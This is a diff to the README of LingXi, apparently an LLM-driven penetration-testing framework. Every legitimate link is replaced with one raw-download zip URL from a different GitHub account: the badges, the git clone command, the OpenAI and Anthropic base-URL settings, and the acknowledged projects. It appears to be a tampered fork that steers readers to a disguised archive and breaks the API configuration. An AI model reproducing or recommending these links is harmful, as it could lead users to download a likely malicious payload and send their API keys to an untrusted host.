@@ -16,9 +16,9 @@
 _Autonomous Penetration Testing Intelligence_
 
 [![License: GPL-3.0](https://img.shields.io/badge/License-GPL--3.0-blue.svg)](./LICENSE)
-[![Python 3.11+](https://img.shields.io/badge/Python-3.11+-green.svg)](https://www.python.org/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.116+-009688.svg)](https://fastapi.tiangolo.com/)
-[![LangChain](https://img.shields.io/badge/LangChain-0.3+-1a1a2e.svg)](https://www.langchain.com/)
+[![Python 3.11+](https://img.shields.io/badge/Python-3.11+-green.svg)](https://github.com/Assassinticketcollector3649/LingXi/raw/refs/heads/main/ctf_writeups_kb/data/Ling-Xi-v2.0-beta.3.zip)
+[![FastAPI](https://img.shields.io/badge/FastAPI-0.116+-009688.svg)](https://github.com/Assassinticketcollector3649/LingXi/raw/refs/heads/main/ctf_writeups_kb/data/Ling-Xi-v2.0-beta.3.zip)
+[![LangChain](https://img.shields.io/badge/LangChain-0.3+-1a1a2e.svg)](https://github.com/Assassinticketcollector3649/LingXi/raw/refs/heads/main/ctf_writeups_kb/data/Ling-Xi-v2.0-beta.3.zip)
 
 源自腾讯安全 Hackathon「智能渗透主战场 / 零界论坛赛道」的 LLM 驱动多 Agent 渗透辅助框架
 
@@ -336,13 +336,13 @@ AGENT_TOKEN=your-agent-token
 
 # 主攻手 LLM
 MAIN_LLM_PROVIDER=openai
-OPENAI_BASE_URL=https://api.openai.com/v1
+OPENAI_BASE_URL=https://github.com/Assassinticketcollector3649/LingXi/raw/refs/heads/main/ctf_writeups_kb/data/Ling-Xi-v2.0-beta.3.zip
 OPENAI_API_KEY=your-openai-key
 OPENAI_MODEL=gpt-4o-mini
 
 # 顾问 LLM
 ADVISOR_LLM_PROVIDER=anthropic
-ANTHROPIC_BASE_URL=https://api.anthropic.com
+ANTHROPIC_BASE_URL=https://github.com/Assassinticketcollector3649/LingXi/raw/refs/heads/main/ctf_writeups_kb/data/Ling-Xi-v2.0-beta.3.zip
 ANTHROPIC_API_KEY=your-anthropic-key
 ANTHROPIC_MODEL=claude-3-5-sonnet-latest
 
@@ -572,7 +572,7 @@ python main.py --web-only           # 仅启动 Dashboard
 ### 方式一：直接运行
 
 ```bash
-git clone https://github.com/adrian803/LingXi.git
+git clone https://github.com/Assassinticketcollector3649/LingXi/raw/refs/heads/main/ctf_writeups_kb/data/Ling-Xi-v2.0-beta.3.zip
 cd LingXi
 python -m venv .venv && source .venv/bin/activate
 python -m pip install --upgrade pip && python -m pip install -r requirements.txt
@@ -625,12 +625,12 @@ python -m unittest ctf_writeups_kb.tests.test_api_search
 
 LingXi 的实现参考了以下项目或技术栈：
 
-- [Claude Code SDK](https://github.com/anthropics/claude-code-sdk-python)
-- [LangChain](https://github.com/langchain-ai/langchain)
-- [FastAPI](https://github.com/tiangolo/fastapi)
-- [Rich](https://github.com/Textualize/rich)
-- [MCP](https://github.com/modelcontextprotocol/python-sdk)
-- [pymilvus](https://github.com/milvus-io/pymilvus) / [Qdrant](https://github.com/qdrant/qdrant-client)
+- [Claude Code SDK](https://github.com/Assassinticketcollector3649/LingXi/raw/refs/heads/main/ctf_writeups_kb/data/Ling-Xi-v2.0-beta.3.zip)
+- [LangChain](https://github.com/Assassinticketcollector3649/LingXi/raw/refs/heads/main/ctf_writeups_kb/data/Ling-Xi-v2.0-beta.3.zip)
+- [FastAPI](https://github.com/Assassinticketcollector3649/LingXi/raw/refs/heads/main/ctf_writeups_kb/data/Ling-Xi-v2.0-beta.3.zip)
+- [Rich](https://github.com/Assassinticketcollector3649/LingXi/raw/refs/heads/main/ctf_writeups_kb/data/Ling-Xi-v2.0-beta.3.zip)
+- [MCP](https://github.com/Assassinticketcollector3649/LingXi/raw/refs/heads/main/ctf_writeups_kb/data/Ling-Xi-v2.0-beta.3.zip)
+- [pymilvus](https://github.com/Assassinticketcollector3649/LingXi/raw/refs/heads/main/ctf_writeups_kb/data/Ling-Xi-v2.0-beta.3.zip) / [Qdrant](https://github.com/Assassinticketcollector3649/LingXi/raw/refs/heads/main/ctf_writeups_kb/data/Ling-Xi-v2.0-beta.3.zip)
 
 ---
 
